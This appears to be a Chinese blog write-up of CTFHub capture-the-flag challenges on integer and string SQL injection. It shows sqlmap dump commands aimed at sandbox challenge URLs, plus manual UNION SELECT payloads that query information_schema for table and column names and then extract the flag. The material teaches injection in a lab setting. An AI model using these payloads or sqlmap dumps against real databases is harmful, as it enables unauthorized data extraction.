---
title: CTFhub注入题目
date: 2020-03-04 16:46:33
toc: true
tags: 
- CTFhub
categories: 
- writeup
---

# SQL注入

## 整数型注入

CTFHub SQL 整数型注入

### sqlmap一把梭

~~~mysql
sqlmap -u "http://challenge-4ac9e4a80dea47f1.sandbox.ctfhub.com:10080/?id=12345" -D sqli -T flag -C flag --dump
~~~

![image](https://user-images.githubusercontent.com/38073810/75864111-8162b580-5e3c-11ea-8fb1-41a231c03db5.png)

### 手注

当我们输入提示的数字1时，前端仅显示了一条数据

![image](https://user-images.githubusercontent.com/38073810/75861793-d8ff2200-5e38-11ea-9f8d-b47a6d0bdd90.png)

构造payload

~~~mysql
1 or 1=1 limit 1 offset 0		回显--->ID=1 Data:ctfhub
1 or 1=1 limit 1 offset 2   回显--->ID=114514 Data:sqli

12345 union select database(),2	 回显--->ID: sqli Data:2
~~~

然后information_schema一把梭

先查表名

~~~mysql
12345 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'
~~~

![image](https://user-images.githubusercontent.com/38073810/75863367-4d3ac500-5e3b-11ea-8a11-a9c2c6a11457.png)

再查字段名

~~~
12345 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'
~~~

![image](https://user-images.githubusercontent.com/38073810/75863140-faf9a400-5e3a-11ea-9f9f-9dc6a651d01b.png)

注入得到flag

~~~mysql
12345 union select flag,2 from sqli.flag
~~~

![image](https://user-images.githubusercontent.com/38073810/75863322-3d22e580-5e3b-11ea-92b1-ed782381b3be.png)



## 字符型注入

CTFHub SQL字符型注入

### sqlmap一把梭

~~~mysql
sqlmap -u "http://challenge-940a484565709b61.sandbox.ctfhub.com:10080/?id=11111" -D sqli -T flag -C flag --dump
~~~

![image](https://user-images.githubusercontent.com/38073810/75870302-c4755680-5e45-11ea-9c77-448ed2c3a843.png)

### 手注

我们输入1看到和整数型注入是一样的，只有两处回显。

然后我们注意引号和注释直接联合查询

~~~mysql
12345' union select database(),2 '
~~~

![image](https://user-images.githubusercontent.com/38073810/75865503-a0624700-5e3e-11ea-84dd-43cfbf41d885.png)

查表

~~~mysql
12345' union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli' '
~~~

![image](https://user-images.githubusercontent.com/38073810/75865885-29797e00-5e3f-11ea-8411-f98a413373fa.png)

查字段

~~~mysql
12345' union select group_concat(column_name) ,2 from information_schema.columns where table_name='flag' #
~~~

![image](https://user-images.githubusercontent.com/38073810/75869982-50d34980-5e45-11ea-97f6-a4639db98034.png)

注入得到flag

~~~mysql
12345' union select flag,2 from sqli.flag #
~~~

![image](https://user-images.githubusercontent.com/38073810/75870595-26ce5700-5e46-11ea-852c-00eb08c034da.png)



将持续更新。。。